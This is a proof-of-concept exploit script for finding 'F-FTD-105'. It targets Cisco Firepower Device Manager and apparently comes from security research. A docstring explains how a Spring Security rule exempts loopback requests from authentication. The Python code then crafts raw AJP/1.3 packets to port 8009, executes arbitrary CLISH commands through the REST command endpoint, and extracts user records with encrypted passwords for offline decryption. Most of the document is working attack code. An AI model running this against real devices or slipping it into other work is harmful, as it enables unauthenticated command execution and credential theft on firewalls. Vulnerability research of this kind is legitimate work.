"""
F-FTD-105: FDM local authentication bypass — 127.0.0.1 exempt from all REST API auth
CONTROLLED ENVIRONMENT ONLY

Root cause (FdmProdWebSecurityConfigurer.java — decompiled from 6.7.0 and 7.0.0):
  Spring Security HttpSecurity rule configured as:
    httpSecurity.authorizeRequests()
      .antMatchers("/**")
      .access("hasIpAddress('localhost') or hasIpAddress('127.0.0.1') or isAuthenticated()")

  Any HTTP request whose getRemoteAddr() returns "localhost" or "127.0.0.1" bypasses
  Spring Security authentication for the ENTIRE FDM REST API.

  FDM Tomcat binds AJP connector on tcp6 ::1:8009 (loopback only).
  When a local process connects directly to AJP 8009, Tomcat sets:
    request.remoteAddr = "127.0.0.1"  (from AJP forward attributes or TCP source)
  Spring Security evaluates hasIpAddress('127.0.0.1') → TRUE → authentication skipped.

Attack surface (local process, no credentials required):
  1. Direct AJP (port 8009): Any local process sends AJP request → authenticated automatically
  2. HTTP to Tomcat HTTP connector (if open, e.g., 127.0.0.1:8443 or 127.0.0.1:8080):
     Same SpEL rule applies to HTTP connector if source IP is loopback

Critical endpoints accessible without authentication via AJP 8009:
  POST /api/fdm/v6/action/command
    Body: {"commandInput": "<CLISH command>", "timeOut": 30}
    Executes arbitrary Cisco CLISH commands and returns output.
    Command model: com.cisco.ngfw.onbox.models.Command
      Fields: commandInput (String), commandOutput (String), timeOut (long)
    This is the FDM web UI's underlying CLI proxy — full CLISH access.

  GET /api/fdm/v6/identity/users
    Returns all FDM user objects including encrypted admin passwords.
    Combined with F-FTD-102: extract + decrypt admin password offline.

  GET /api/fdm/v6/action/command/{objId}
    Retrieve previous command output.

  POST /api/fdm/v6/action/backup
    Trigger config backup without authentication.

  GET /api/fdm/v6/policy/**
    Read full firewall policy (access lists, NAT, VPN config) without auth.

AJP protocol version: AJP/1.3 (Apache JServ Protocol 1.3)
  AJP 1.3 packet structure:
    0x12 0x34        — magic bytes (client → server)
    length (2B BE)   — payload length
    prefix_code (1B) — 2=forward request, 7=shutdown, 8=ping
    method (1B)      — HTTP method: 0x02=GET, 0x04=POST, etc.
    protocol (string)— "HTTP/1.1"
    req_uri (string) — the request URI
    remote_addr (string) — client IP (127.0.0.1)
    remote_host (string) — client hostname (localhost)
    server_name (string)
    server_port (2B)
    is_ssl (1B)
    num_headers (2B)
    headers: list of (name, value) pairs
    attributes: terminated by 0xFF

AJP string encoding: 2B big-endian length + UTF-8 bytes + 0x00 terminator
  Special: 0xFF 0xFF = empty/null string

Severity: HIGH (local access required)
  - Impact: Full unauthenticated FDM REST API access from any local FTD process
  - Chained from: initial local shell access (serial, SSH, LPE via other finding)
  - Chained to: F-FTD-102 (user list + password decrypt), /action/command (CLISH exec)
  - Primary impact: unauthenticated CLISH command execution with FDM privileges
  - Secondary: read full policy, trigger backups, modify management IPs

WebSecurity.ignoring() paths (no Spring Security at all — accessible externally):
  /api/versions, /api-explorer/**, /index.jsp, /failure.html
  /assets/**/*, /branding/**, /dojo-project/**, /media/**, /help/fdm/**
  /api-explorer/ contains Swagger UI for FDM REST API — leaks full API surface

Confirmed from:
  FdmProdWebSecurityConfigurer.class (6.7.0 ftd-p8/WEB-INF/classes/)
  UnifiedWebSecurityConfigurer.class (core-security.jar)
  Command.class (com.cisco.ngfw.onbox.models.Command — commandInput/commandOutput/timeOut)
  resources-context.xml (/action/command → commandResource bean)
"""

# CONTROLLED ENVIRONMENT ONLY

import argparse
import json
import socket
import struct
import sys
from typing import Optional


FINDING = "F-FTD-105"
LABEL = "FDM local authentication bypass — 127.0.0.1 exempt from all REST API auth"
DEFAULT_HOST = "127.0.0.1"
DEFAULT_AJP_PORT = 8009
DEFAULT_API_BASE = "/api/fdm/v6"


# AJP/1.3 constants
AJP_MAGIC_CLIENT = b'\x12\x34'
AJP_FORWARD_REQUEST = 0x02

AJP_METHOD = {
    'GET': 0x02,
    'POST': 0x04,
    'PUT': 0x07,
    'DELETE': 0x08,
}

# Common AJP header codes (0xA0xx = predefined headers)
AJP_HEADER_NAMES = {
    'Accept':          0xA001,
    'Accept-Charset':  0xA002,
    'Accept-Encoding': 0xA003,
    'Accept-Language': 0xA004,
    'Authorization':   0xA005,
    'Connection':      0xA006,
    'Content-Type':    0xA007,
    'Content-Length':  0xA008,
    'Cookie':          0xA009,
    'Cookie2':         0xA00A,
    'Host':            0xA00B,
    'Pragma':          0xA00C,
    'Referer':         0xA00D,
    'User-Agent':      0xA00E,
}


def ajp_encode_string(s: Optional[str]) -> bytes:
    """Encode string in AJP format: 2B length (BE) + UTF-8 bytes + 0x00."""
    if s is None:
        return b'\xFF\xFF'
    encoded = s.encode('utf-8')
    return struct.pack('>H', len(encoded)) + encoded + b'\x00'


def build_ajp_forward_request(method: str, uri: str, host: str, port: int,
                               headers: Optional[dict] = None,
                               body: Optional[bytes] = None,
                               remote_addr: str = '127.0.0.1',
                               remote_host: str = 'localhost') -> bytes:
    """
    Build AJP/1.3 forward request packet.

    When Tomcat receives this with remote_addr=127.0.0.1, Spring Security's
    hasIpAddress('127.0.0.1') evaluates to TRUE — authentication bypassed.
    """
    if headers is None:
        headers = {}
    if body:
        headers['Content-Length'] = str(len(body))
        if 'Content-Type' not in headers:
            headers['Content-Type'] = 'application/json'
    headers['Host'] = host

    payload = bytes()
    payload += bytes([AJP_FORWARD_REQUEST])     # prefix code: forward request
    payload += bytes([AJP_METHOD.get(method.upper(), 0x02)])  # HTTP method
    payload += ajp_encode_string('HTTP/1.1')    # protocol
    payload += ajp_encode_string(uri)           # request URI
    payload += ajp_encode_string(remote_addr)   # remote addr (127.0.0.1 → auth bypass)
    payload += ajp_encode_string(remote_host)   # remote host
    payload += ajp_encode_string(host)          # server name
    payload += struct.pack('>H', port)          # server port
    payload += b'\x00'                          # is_ssl=false

    # Headers
    payload += struct.pack('>H', len(headers))  # num_headers
    for name, value in headers.items():
        code = AJP_HEADER_NAMES.get(name)
        if code:
            payload += struct.pack('>H', code)
        else:
            payload += ajp_encode_string(name)
        payload += ajp_encode_string(value)

    # Attributes (terminate with 0xFF)
    payload += b'\xFF'

    # AJP packet: magic + 2B length + payload
    packet = AJP_MAGIC_CLIENT + struct.pack('>H', len(payload)) + payload
    return packet


def parse_ajp_response(data: bytes) -> dict:
    """Parse AJP server response packets."""
    results = {'headers': {}, 'body': b'', 'status': None}
    offset = 0

    while offset < len(data):
        if offset + 4 > len(data):
            break
        magic = data[offset:offset+2]
        length = struct.unpack('>H', data[offset+2:offset+4])[0]
        offset += 4

        if offset + length > len(data):
            body_chunk = data[offset:]
            results['body'] += body_chunk
            break

        payload = data[offset:offset+length]
        offset += length

        if not payload:
            continue

        prefix = payload[0]

        if prefix == 0x04:  # SEND_HEADERS
            if len(payload) >= 3:
                status_code = struct.unpack('>H', payload[1:3])[0]
                results['status'] = status_code
            # Parse headers (skip status message, then header count)
            pos = 3
            # Status message (string)
            if pos + 2 <= len(payload):
                msg_len = struct.unpack('>H', payload[pos:pos+2])[0]
                if msg_len == 0xFFFF:
                    pos += 2
                else:
                    pos += 2 + msg_len + 1
            # Num headers
            if pos + 2 <= len(payload):
                num_headers = struct.unpack('>H', payload[pos:pos+2])[0]
                pos += 2
                for _ in range(num_headers):
                    if pos + 2 > len(payload):
                        break
                    code = struct.unpack('>H', payload[pos:pos+2])[0]
                    pos += 2
                    if code & 0xFF00 == 0xA000:
                        name = f'0x{code:04x}'
                    else:
                        name_len = code
                        name = payload[pos:pos+name_len].decode('utf-8', errors='replace')
                        pos += name_len + 1
                    if pos + 2 <= len(payload):
                        val_len = struct.unpack('>H', payload[pos:pos+2])[0]
                        pos += 2
                        if val_len != 0xFFFF:
                            val = payload[pos:pos+val_len].decode('utf-8', errors='replace')
                            pos += val_len + 1
                            results['headers'][name] = val

        elif prefix == 0x03:  # SEND_BODY_CHUNK
            if len(payload) >= 3:
                chunk_len = struct.unpack('>H', payload[1:3])[0]
                results['body'] += payload[3:3+chunk_len]

        elif prefix == 0x05:  # END_RESPONSE
            break

    return results


def send_body_chunk(conn: socket.socket, body: bytes) -> None:
    """Send body chunk via AJP (after forward request with Content-Length)."""
    # AJP body chunk from client: 0x12 0x34 + length + body_length + body
    chunk_header = struct.pack('>H', len(body))
    packet = AJP_MAGIC_CLIENT + struct.pack('>H', len(body) + 2) + chunk_header + body
    conn.sendall(packet)


def ajp_request(host: str, ajp_port: int, method: str, uri: str,
                headers: Optional[dict] = None, body: Optional[bytes] = None,
                timeout: int = 10) -> dict:
    """Send AJP/1.3 request to Tomcat and return parsed response."""
    result = {'connected': False, 'status': None, 'headers': {}, 'body': b'', 'error': None}

    try:
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.settimeout(timeout)
        conn.connect((host, ajp_port))
        result['connected'] = True
    except Exception as e:
        result['error'] = f"Connection failed: {e}"
        return result

    try:
        packet = build_ajp_forward_request(method, uri, host, 443, headers, body)
        conn.sendall(packet)

        if body:
            send_body_chunk(conn, body)

        # Read all response data
        resp_data = b''
        conn.settimeout(5)
        try:
            while True:
                chunk = conn.recv(8192)
                if not chunk:
                    break
                resp_data += chunk
        except socket.timeout:
            pass

        parsed = parse_ajp_response(resp_data)
        result.update(parsed)

    except Exception as e:
        result['error'] = str(e)
    finally:
        conn.close()

    return result


def probe_command_exec(host: str, ajp_port: int, command: str = 'show version') -> dict:
    """
    POST /api/fdm/v6/action/command without credentials via AJP.

    The Command endpoint executes CLISH commands on FTD and returns output.
    Authentication bypass: remote_addr=127.0.0.1 → hasIpAddress('127.0.0.1') = TRUE.
    """
    uri = f"{DEFAULT_API_BASE}/action/command"
    body = json.dumps({
        'commandInput': command,
        'timeOut': 30,
        'version': 'v6',
        'type': 'Command'
    }).encode('utf-8')
    headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
    }
    return ajp_request(host, ajp_port, 'POST', uri, headers, body)


def probe_user_list(host: str, ajp_port: int) -> dict:
    """GET /api/fdm/v6/identity/users — list all FDM users (includes encrypted passwords)."""
    uri = f"{DEFAULT_API_BASE}/identity/users"
    headers = {'Accept': 'application/json'}
    return ajp_request(host, ajp_port, 'GET', uri, headers)


def probe_policy_list(host: str, ajp_port: int) -> dict:
    """GET /api/fdm/v6/policy/accesspolicies — read ACL without auth."""
    uri = f"{DEFAULT_API_BASE}/policy/accesspolicies"
    headers = {'Accept': 'application/json'}
    return ajp_request(host, ajp_port, 'GET', uri, headers)


def probe_device_info(host: str, ajp_port: int) -> dict:
    """GET /api/fdm/v6/devices/default — device info without auth."""
    uri = f"{DEFAULT_API_BASE}/devices/default"
    headers = {'Accept': 'application/json'}
    return ajp_request(host, ajp_port, 'GET', uri, headers)


PROBES = [
    ('GET /api/versions (unauthenticated by design)', 'GET', '/api/versions', None, None),
    ('GET /api/fdm/v6/devices/default (device info)', 'GET', '/api/fdm/v6/devices/default', None, None),
    ('GET /api/fdm/v6/identity/users (user list)', 'GET', '/api/fdm/v6/identity/users', None, None),
    ('GET /api/fdm/v6/policy/accesspolicies (ACL)', 'GET', '/api/fdm/v6/policy/accesspolicies', None, None),
]


def main() -> None:
    ap = argparse.ArgumentParser(description=f'{FINDING}: {LABEL}')
    ap.add_argument('host', nargs='?', default=DEFAULT_HOST,
                    help=f'AJP target host (default: {DEFAULT_HOST})')
    ap.add_argument('--ajp-port', type=int, default=DEFAULT_AJP_PORT,
                    help=f'AJP port (default: {DEFAULT_AJP_PORT})')
    ap.add_argument('--mode', choices=['probe', 'command', 'users'], default='probe',
                    help='probe: GET probes against multiple endpoints; '
                         'command: POST to /action/command (CLISH exec); '
                         'users: GET /identity/users (password exfil)')
    ap.add_argument('--command', default='show version',
                    help='CLISH command to execute (mode=command only)')
    ap.add_argument('--timeout', type=int, default=10)
    args = ap.parse_args()

    print(f'[*] {FINDING}: {LABEL}')
    print(f'[*] Target AJP: {args.host}:{args.ajp_port}')
    print('[!] CONTROLLED ENVIRONMENT ONLY')
    print('[!] Auth bypass: remote_addr=127.0.0.1 → Spring Security hasIpAddress check → PASS')
    print('[!] Source: FdmProdWebSecurityConfigurer.class — /**')
    print('[!]   .access("hasIpAddress(\'localhost\') or hasIpAddress(\'127.0.0.1\') or isAuthenticated()")')
    print()

    if args.mode == 'probe':
        print('[1] Probing multiple FDM REST endpoints via AJP without credentials...')
        headers = {'Accept': 'application/json'}
        for label, method, uri, extra_headers, body in PROBES:
            h = dict(headers)
            if extra_headers:
                h.update(extra_headers)
            result = ajp_request(args.host, args.ajp_port, method, uri, h, body, args.timeout)
            status = result['status'] or 'N/A'
            body_preview = result['body'][:120].decode('utf-8', errors='replace').replace('\n', ' ')
            connected = '[+]' if result['connected'] else '[-]'
            auth_bypass = '[AUTH BYPASS]' if result['status'] in (200, 201, 202) else ''
            print(f'  {connected} {method} {uri} → HTTP {status} {auth_bypass}')
            if body_preview:
                print(f'       {body_preview}')
            if result['error']:
                print(f'       ERROR: {result["error"]}')

    elif args.mode == 'command':
        print(f'[1] POST /api/fdm/v6/action/command via AJP — command: {args.command!r}')
        result = probe_command_exec(args.host, args.ajp_port, args.command)
        status = result['status']
        print(f'    HTTP status: {status}')
        if result['body']:
            try:
                data = json.loads(result['body'])
                output = data.get('commandOutput', '')
                print(f'[!] COMMAND OUTPUT:\n{output}')
            except json.JSONDecodeError:
                print(f'    Raw response: {result["body"][:500]}')
        if result['error']:
            print(f'[-] Error: {result["error"]}')

    elif args.mode == 'users':
        print('[1] GET /api/fdm/v6/identity/users via AJP — extracting user list...')
        result = probe_user_list(args.host, args.ajp_port)
        status = result['status']
        print(f'    HTTP status: {status}')
        if result['body']:
            try:
                data = json.loads(result['body'])
                users = data.get('items', [])
                print(f'[+] Users returned: {len(users)}')
                for u in users:
                    username = u.get('username', '?')
                    enc_pw = u.get('password', u.get('encryptedPassword', '?'))
                    user_id = u.get('id', '?')
                    print(f'    username={username!r} id={user_id} enc_pw={str(enc_pw)[:60]}...')
                    print(f'    → Decrypt with F-FTD-102 (Neo4j AES key) for plaintext password')
            except json.JSONDecodeError:
                print(f'    Raw response: {result["body"][:500]}')
        if result['error']:
            print(f'[-] Error: {result["error"]}')

    print()
    print(f'[*] Chain summary:')
    print(f'    F-FTD-105 (AJP local bypass) → /api/fdm/v6/action/command (CLISH exec)')
    print(f'    F-FTD-105 (AJP local bypass) → GET /identity/users → F-FTD-102 (decrypt pw)')
    print(f'    F-FTD-105 standalone: read full firewall policy without authentication')
    print()
    print(f'    Requires: local access to FTD (admin shell / serial / SSH)')
    print(f'    AJP port: tcp6 ::1:8009 (loopback — local only)')
    print(f'    Spring Security SpEL rule: .access("hasIpAddress(\'localhost\') or')
    print(f'      hasIpAddress(\'127.0.0.1\') or isAuthenticated()") on /**')


if __name__ == '__main__':
    main()
